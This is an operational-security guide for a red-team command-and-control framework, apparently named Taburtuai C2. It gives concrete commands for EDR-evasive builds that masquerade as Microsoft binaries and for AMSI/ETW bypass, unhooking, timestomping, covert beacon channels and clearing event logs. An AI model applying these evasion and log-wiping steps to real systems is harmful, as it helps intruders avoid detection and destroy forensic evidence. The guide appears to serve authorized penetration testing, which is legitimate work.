# OPSEC Guide

Operational security practices for running engagements with Taburtuai C2 without getting caught or causing unintended damage.

---

## Before Deployment

### Choose the Right Profile

Don't deploy with the `default` profile in a monitored environment. Match the profile to the target's network posture:

| Target Environment | Recommended Profile | Traffic Profile |
|-------------------|-------------------|-----------------|
| Internal lab, no EDR | `default` | Any |
| Corporate with basic AV | `opsec` | `cdn` or `jquery` |
| Corporate with EDR (Defender, CrowdStrike) | `stealth` | `office365` or `slack` |
| SOC-monitored, mature security | `paranoid` | `ocsp` with domain fronting |

### Build Uniqueness

Every build should use a different per-binary config:
```bash
# Different output name, realistic masquerade for each target
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --masq-company "Microsoft Corporation" \
  --masq-desc "Windows Defender Advanced Threat Protection" \
  --masq-orig "MsSense.exe" \
  --no-gui \
  --output ./builds/target_corp_$(date +%Y%m%d).exe
```

Log the SHA256 of each build so you know which binary is deployed where.

### Set a Kill Date

Always set a kill date matching your engagement end:
```bash
--kill-date 2026-05-31
```

### Test Before Deploying

In your own lab:
1. Run the agent and verify it checks in
2. Run `opsec antidebug` and `opsec antivm` to ensure checks pass
3. Test each technique you plan to use
4. Verify the agent connects through the intended traffic profile

---

## During the Engagement

### Evasion First Sequence

Every time you start a new session on a fresh agent (especially on a monitored host), run in this order:

```
1. opsec antidebug <id>    → verify not in sandbox
2. opsec antivm <id>       → verify not in a detonation VM
3. evasion unhook <id>     → remove EDR's userland hooks
4. bypass amsi <id>        → patch AMSI
5. bypass etw <id>         → suppress ETW
→  Now proceed with your techniques
```

### Sleeping Between Actions

On slow beacon targets, the agent naturally sleeps. On fast-beacon agents (default/aggressive), consider manually triggering obfuscated sleep between noisy operations:

```
❯ evasion sleep a1b2 --duration 120
```

This encrypts memory and sleeps for 2 minutes — a gap in telemetry that makes your activity timeline harder to reconstruct.

### Avoid These Patterns

| Action | Why Risky | Alternative |
|--------|-----------|------------|
| `CreateRemoteThread` injection | #1 most-flagged API sequence | Use `mapinject` or `stomp` |
| Spawning `powershell.exe` with encoded command | Extremely common malware pattern | PS runspace (`--method ps-runspace`) |
| Killing AV process | Requires SYSTEM, generates immediate alert | AMSI/ETW bypass instead |
| Writing to `C:\Windows\Temp\` | Heavily monitored directory | Use legitimate-looking paths in AppData, ProgramData |
| Drop PE on disk then execute | On-disk file scanning | Use fileless injection or in-memory exec |
| Command-line with long Base64 | Pattern-matched by EDR | Fragment the payload or use stage delivery |

### Naming Conventions

Name every dropped file after a legitimate Windows binary:
- `MicrosoftEdgeUpdate.exe` (in `C:\ProgramData\Microsoft\EdgeUpdate\`)
- `OneDriveStandaloneUpdater.exe` (in `C:\Program Files\Microsoft OneDrive\`)
- `GoogleCrashHandler.exe` (in `C:\Program Files\Google\Update\`)

Name persistence registry values after legitimate ones:
- `OneDrive`, `SecurityHealth`, `Teams`, `MicrosoftEdgeAutoLaunch_...`

### Timestomp Every Dropped File

```
❯ timestomp a1b2 "C:\ProgramData\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" \
    --ref "C:\Windows\System32\svchost.exe"
```

Do this immediately after any upload, before the file's new timestamp is captured in any log.

### Minimum Footprint

Don't deploy every capability you have — only what's needed for the engagement objective:
- Initial access: just the agent, no tools dropped yet
- Local priv esc: only after confirming current privileges are insufficient
- Credential access: only after evasion is applied
- Lateral movement: only after verifying the target exists and is reachable
- Cleanup as you go — don't leave tools on disk any longer than needed

---

## Covert Channel Selection

| Channel | Best For | Avoid When |
|---------|----------|-----------|
| HTTP (default) | Internal C2, lab | Monitored egress, no internet from target |
| HTTPS | Public internet C2 | Certificate inspection is active (use pinning) |
| DNS-over-HTTPS | Egress-locked networks | DoH is blocked (rare) |
| ICMP | Minimal detection, needs routing | ICMP filtering at perimeter |
| SMB Named Pipe | Lateral-only C2 (no internet needed) | Target doesn't run SMB service |

### Beacon Timing Recommendations

| Environment | Interval | Jitter |
|-------------|----------|--------|
| Home lab / training | 10–30s | 20% |
| Corporate (light monitoring) | 60s | 30% |
| Corporate (EDR present) | 120–300s | 40% |
| SOC + NDR + EDR | 300–600s | 50% |

The higher the monitoring maturity, the slower you beacon. A 5-minute interval with 50% jitter generates beacons randomly between 2.5 and 7.5 minutes apart — extremely difficult to detect via traffic analysis.

---

## Cleanup

At the end of every engagement, in reverse order of deployment:

```
# 1. Remove persistence
❯ persistence remove a1b2 --method registry_run --name "WindowsUpdate"

# 2. Delete dropped files
❯ cmd a1b2 "del C:\ProgramData\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"

# 3. Remove registry modifications
❯ registry delete a1b2 HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -V UseLogonCredential

# 4. Clear event logs (if authorized — discuss with client first)
❯ cmd a1b2 "wevtutil cl System"
❯ cmd a1b2 "wevtutil cl Security"
❯ cmd a1b2 "wevtutil cl Application"

# 5. Terminate the agent
❯ cmd a1b2 "taskkill /f /pid <agent-pid>"

# 6. Remove agent record from C2 server
❯ agents delete a1b2

# 7. Shut down C2 server or rotate infrastructure
```

**Note on log clearing:** Clearing Windows event logs is itself a high-confidence indicator (Event ID 1102). Only do this if explicitly authorized and part of the engagement scope. Many clients prefer you leave logs intact for their own forensic review.

---

## Infrastructure Hygiene

- Use a VPS or redirector between the operator machine and the C2 server — never expose your actual IP
- Terminate engagement infrastructure immediately at end of engagement
- Use Let's Encrypt certs with a domain that looks legitimate (not `evil-c2.xyz`)
- Rotate encryption keys between engagements
- Never reuse agent builds across different engagements — per-engagement builds with unique keys
